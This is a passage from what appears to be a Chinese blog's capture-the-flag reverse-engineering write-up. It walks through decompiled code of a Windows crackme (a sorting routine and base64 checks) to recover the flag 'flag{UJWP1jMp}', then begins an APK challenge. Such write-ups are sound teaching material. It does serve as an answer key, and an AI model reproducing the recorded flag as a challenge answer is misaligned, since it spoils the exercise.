class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __stdcall <span class="title function_">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span><br><span class="line">{</span><br><span class="line">  DialogBoxParamA(hInstance, (LPCSTR)<span class="number">0x67</span>, <span class="number">0</span>, DialogFunc, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>双击查看<code>DialogFunc</code>函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">BOOL __stdcall <span class="title function_">DialogFunc</span><span class="params">(HWND hDlg, UINT a2, WPARAM a3, LPARAM a4)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+8h] [ebp-20030h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+Ch] [ebp-2002Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+10h] [ebp-20028h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+14h] [ebp-20024h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+18h] [ebp-20020h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+1Ch] [ebp-2001Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+20h] [ebp-20018h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+24h] [ebp-20014h]</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [esp+28h] [ebp-20010h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [esp+2Ch] [ebp-2000Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+30h] [ebp-20008h]</span></span><br><span class="line">  CHAR String; <span class="comment">// [esp+34h] [ebp-20004h]</span></span><br><span class="line">  <span class="type">char</span> v19; <span class="comment">// [esp+35h] [ebp-20003h]</span></span><br><span class="line">  <span class="type">char</span> v20; <span class="comment">// [esp+36h] [ebp-20002h]</span></span><br><span class="line">  <span class="type">char</span> v21; <span class="comment">// [esp+37h] [ebp-20001h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+38h] [ebp-20000h]</span></span><br><span class="line">  <span class="type">char</span> v23; <span class="comment">// [esp+39h] [ebp-1FFFFh]</span></span><br><span class="line">  <span class="type">char</span> v24; <span class="comment">// [esp+3Ah] [ebp-1FFFEh]</span></span><br><span class="line">  <span class="type">char</span> v25; <span class="comment">// [esp+3Bh] [ebp-1FFFDh]</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// [esp+10034h] [ebp-10004h]</span></span><br><span class="line">  <span class="type">char</span> v27; <span class="comment">// [esp+10035h] [ebp-10003h]</span></span><br><span class="line">  <span class="type">char</span> v28; <span class="comment">// [esp+10036h] [ebp-10002h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">272</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">273</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 == <span class="number">1001</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">memset</span>(&amp;String, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">    GetDlgItemTextA(hDlg, <span class="number">1000</span>, &amp;String, <span class="number">0xFFFF</span>);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;String) == <span class="number">8</span> )</span><br><span class="line">    {<span class="comment">//将光标移至数字上，按'R'键，将数字转为对应的字符</span></span><br><span class="line">      v7 = <span class="number">90</span>;                     <span class="comment">//'Z'</span></span><br><span class="line">      v8 = <span class="number">74</span>;                     <span class="comment">//'J'</span></span><br><span class="line">      v9 = <span class="number">83</span>;                     <span class="comment">//'S'</span></span><br><span class="line">      v10 = <span class="number">69</span>;                    <span class="comment">//'E'</span></span><br><span class="line">      v11 = <span class="number">67</span>;                    <span class="comment">//'C'</span></span><br><span class="line">      v12 = <span class="number">97</span>;                    <span class="comment">//'a'</span></span><br><span class="line">      v13 = <span class="number">78</span>;                    <span class="comment">//'N'</span></span><br><span class="line">      v14 = <span class="number">72</span>;                    <span class="comment">//'H'</span></span><br><span class="line">      v15 = <span class="number">51</span>;                    <span class="comment">//'3'</span></span><br><span class="line">      v16 = <span class="number">110</span>;                   <span class="comment">//'n'</span></span><br><span class="line">      v17 = <span class="number">103</span>;                   <span class="comment">//'g'</span></span><br><span class="line">      sub_4010F0(&amp;v7, <span class="number">0</span>, <span class="number">10</span>);      </span><br><span class="line">      <span class="built_in">memset</span>(&amp;v26, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v26 = v23;</span><br><span class="line">      v28 = v25;</span><br><span class="line">      v27 = v24;</span><br><span class="line">      v4 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(&amp;v26, <span class="built_in">strlen</span>(&amp;v26));</span><br><span class="line">      <span class="built_in">memset</span>(&amp;v26, <span class="number">0</span>, <span class="number">0xFFFF</span>u);</span><br><span class="line">      v27 = v21;</span><br><span class="line">      v26 = v20;</span><br><span class="line">      v28 = v22;</span><br><span class="line">      v5 = (<span class="type">const</span> <span class="type">char</span> *)sub_401000(&amp;v26, <span class="built_in">strlen</span>(&amp;v26));</span><br><span class="line">      <span class="keyword">if</span> ( String == v7 + <span class="number">34</span></span><br><span class="line">        &amp;&amp; v19 == v11</span><br><span class="line">        &amp;&amp; <span class="number">4</span> * v20 - <span class="number">141</span> == <span class="number">3</span> * v9</span><br><span class="line">        &amp;&amp; v21 / <span class="number">4</span> == <span class="number">2</span> * (v14 / <span class="number">9</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">"ak1w"</span>)</span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">"V1Ax"</span>) )</span><br><span class="line">      {</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">"U g3t 1T!"</span>, <span class="string">"@_@"</span>, <span class="number">0</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( (_WORD)a3 != <span class="number">1</span> &amp;&amp; (_WORD)a3 != <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  EndDialog(hDlg, (<span class="type">unsigned</span> __int16)a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>分析代码猜测第49行的函数<code>sub_4010F0</code>比较重要，双击进入，查看代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_4010F0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  {</span><br><span class="line">    v5 = <span class="number">4</span> * i;</span><br><span class="line">    v6 = *(_DWORD *)(<span class="number">4</span> * i + a1);</span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; *(_DWORD *)(a1 + <span class="number">4</span> * result) )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          *(_DWORD *)(v5 + a1) = *(_DWORD *)(a1 + <span class="number">4</span> * result);</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(_DWORD *)(a1 + <span class="number">4</span> * i) &lt;= v6 )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = <span class="number">4</span> * i;</span><br><span class="line">          *(_DWORD *)(a1 + <span class="number">4</span> * result) = *(_DWORD *)(<span class="number">4</span> * i + a1);</span><br><span class="line">        }</span><br><span class="line">        --result;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    }</span><br><span class="line">LABEL_13:</span><br><span class="line">    *(_DWORD *)(a1 + <span class="number">4</span> * result) = v6;</span><br><span class="line">    sub_4010F0(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>根据传入的参数可知，<code>a1 = &amp;v7（即v7的地址）</code>，<code>a2 = 0</code>，<code>a3 = 10（v17与v7正好相差10）</code>，直接将v7~v17作为字符串带入，将上述函数稍作修改，运行以下代码</p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4010F0</span><span class="params">(<span class="type">char</span> *a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; i &lt;= a3; a2 = i )</span><br><span class="line">  {</span><br><span class="line">    v5 = i;</span><br><span class="line">    v6 = a1[i];        <span class="comment">//*(_DWORD *)(i + a1);</span></span><br><span class="line">    <span class="keyword">if</span> ( a2 &lt; result &amp;&amp; i &lt; result )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v6 &gt; a1[result] )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++i;</span><br><span class="line">          a1[v5] = a1[result];</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">while</span> ( a1[i]&lt;= v6 )</span><br><span class="line">          {</span><br><span class="line">            <span class="keyword">if</span> ( ++i &gt;= result )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v5 = i;</span><br><span class="line">          a1[result] = a1[i];</span><br><span class="line">        }</span><br><span class="line">        --result;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; result );</span><br><span class="line">    }</span><br><span class="line">LABEL_13:</span><br><span class="line">    a1[result] = v6;</span><br><span class="line">    <span class="built_in">sub_4010F0</span>(a1, a2, i - <span class="number">1</span>);</span><br><span class="line">    result = a3;</span><br><span class="line">    ++i;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>{</span><br><span class="line">  <span class="type">char</span> v[<span class="number">12</span>]=<span class="string">"ZJSECaNH3ng"</span>;</span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line">  result = <span class="built_in">sub_4010F0</span>(v,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">  cout&lt;&lt;v&lt;&lt;endl;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>上述脚本中，主要将<code>4*i</code>修改为了<code>i</code>，因为原本的<code>a1</code>为int型，长度为4个字节，当<code>a1</code>作为起始地址时，所占空间为4个字节，因此下一个数字的地址应为<code>a1+4</code>；而我将原来的v7~v17字符转为了字符串，于是我将<code>sub_4010F0</code>中int类型的<code>a1</code>改为了字符指针，利用字符数组存放v7~ v17的值，因此就不需要将 i 乘以 4了，并将<code>*(_DWORD *)(i + a1)</code>改为了<code>a1[i]</code>，运行得到<code>3CEHJNSZagn</code>。</p><p>继续回到<code>DialogFunc</code>中查看，在第54和59行发现<code>sub_401000</code>函数，双击查看</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__cdecl <span class="title function_">sub_401000</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v10; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v12; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v13; <span class="comment">// esi</span></span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line">  _BYTE *v15; <span class="comment">// [esp+Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE *v16; <span class="comment">// [esp+10h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// [esp+14h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [esp+18h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a2 / <span class="number">3</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 % <span class="number">3</span> &gt; <span class="number">0</span> )</span><br><span class="line">    ++v2;</span><br><span class="line">  v4 = <span class="number">4</span> * v2 + <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(v4);</span><br><span class="line">  v6 = v5;</span><br><span class="line">  v15 = v5;</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, v4);</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v8 = v6;</span><br><span class="line">  v16 = v6;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      v18 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt;= v7 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        ++v10;</span><br><span class="line">        v9 = *(<span class="type">unsigned</span> __int8 *)(v3++ + a1) | (v9 &lt;&lt; <span class="number">8</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( v10 &lt; <span class="number">3</span> );</span><br><span class="line">      v11 = v9 &lt;&lt; <span class="number">8</span> * (<span class="number">3</span> - v10);</span><br><span class="line">      v12 = <span class="number">0</span>;</span><br><span class="line">      v17 = v3;</span><br><span class="line">      v13 = <span class="number">18</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( v10 &gt;= v12 )</span><br><span class="line">        {</span><br><span class="line">          *((_BYTE *)&amp;v18 + v12) = (v11 &gt;&gt; v13) &amp; <span class="number">0x3F</span>;</span><br><span class="line">          v8 = v16;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          *((_BYTE *)&amp;v18 + v12) = <span class="number">64</span>;</span><br><span class="line">        }</span><br><span class="line">        *v8++ = byte_407830[*((<span class="type">char</span> *)&amp;v18 + v12)];</span><br><span class="line">        v13 -= <span class="number">6</span>;</span><br><span class="line">        ++v12;</span><br><span class="line">        v16 = v8;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( v13 &gt; <span class="number">-6</span> );</span><br><span class="line">      v3 = v17;</span><br><span class="line">      <span class="keyword">if</span> ( v17 &gt;= a2 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = a2;</span><br><span class="line">    }</span><br><span class="line">    v6 = v15;</span><br><span class="line">  }</span><br><span class="line">  result = v6;</span><br><span class="line">  *v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现第65行的一个数组<code>byte_407830</code>，双击查看</p><figure><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20220905121435536.png" alt="image-20220905121435536"><figcaption aria-hidden="true">image-20220905121435536</figcaption></figure><p>推测可能时base64编码。</p><p>回到<code>DialogFunc</code>中，前面得到v7~v17经过处理后的值为<code>3CEHJNSZagn</code>，分析剩下的代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( String == v7 + <span class="number">34</span>      <span class="comment">//v7对应的ASCII码 51 ，所以String的值为 85 ，对应的字符为'U'</span></span><br><span class="line">        &amp;&amp; v19 == v11       <span class="comment">//v19的值为经过处理后的v11的值'J'</span></span><br><span class="line">        &amp;&amp; <span class="number">4</span> * v20 - <span class="number">141</span> == <span class="number">3</span> * v9   <span class="comment">//v20 = (3 * v9 + 141) / 4，v20的值为'W'</span></span><br><span class="line">        &amp;&amp; v21 / <span class="number">4</span> == <span class="number">2</span> * (v14 / <span class="number">9</span>)  <span class="comment">//v21 = 2 * (v14 / 9) * 4，v21的值为'P'</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v4, <span class="string">"ak1w"</span>)     <span class="comment">//由 v4 = (const char *)sub_401000(&amp;v26, strlen(&amp;v26))可知，需将'ak1w'进行base64解码，得到'jMp'</span></span><br><span class="line">        &amp;&amp; !<span class="built_in">strcmp</span>(v5, <span class="string">"V1Ax"</span>) )   <span class="comment">//同理，将'V1Ax'进行base64解码，得到'WP1'</span></span><br><span class="line">      {</span><br><span class="line">        MessageBoxA(hDlg, <span class="string">"U g3t 1T!"</span>, <span class="string">"@_@"</span>, <span class="number">0</span>);</span><br><span class="line">      }</span><br></pre></td></tr></tbody></table></figure><p>对得到的字符串进行拼接，得到<code>flag{UJWP1jMp}</code>。</p><h3 id="简单注册器">15.简单注册器</h3><p>打开下载的压缩包发现是apk文件，于是尝试用ApkIDE打开文件，发现一段特殊字符<strong>dd2940c04462b4dd7c450528835cca15</strong></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">.line 44</span><br><span class="line">    :cond_1</span><br><span class="line">    if-ne v2, v10, :cond_3</span><br><span class="line"></span><br><span class="line">    .line 46</span><br><span class="line">    const-string v3, "dd2940c04462b4dd7c450528835cca15"</span><br><span class="line"></span><br><span class="line">    .line 47</span><br><span class="line">    .local v3, "flagtrue":Ljava/lang/String;</span><br><span class="line">    invoke-virtual {v3}, Ljava/lang/String;-&gt;toCharArray()[C</span><br><span class="line"></span><br><span class="line">    move-result-object v5</span><br><span 